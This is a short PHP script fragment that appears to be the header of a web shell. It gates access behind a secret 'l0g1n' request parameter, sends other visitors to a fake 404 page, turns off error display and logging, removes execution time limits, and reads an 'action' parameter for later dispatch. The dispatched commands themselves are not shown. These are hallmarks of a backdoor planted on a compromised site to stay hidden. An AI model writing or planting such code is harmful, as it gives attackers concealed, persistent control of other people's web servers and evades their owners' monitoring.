<?php
@session_start();
if(isset($_REQUEST['l0g1n'])) {
    $_SESSION['l0g1n']=session_id();;
}
if(!isset($_SESSION['l0g1n'])) {
    header("Location: http://".$_SERVER['SERVER_NAME']."/404.html");
}
$ver="2.4";
// --------------------------------------------- globals 
@ini_set('display_errors',0);
@ini_set('log_errors',0);
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('max_execution_time',0);
$pageend='</body></html>';

if($_POST['action']!="") {
    $_SESSION['action']=$_POST['action'];
    $action=$_SESSION['action'];
}
?>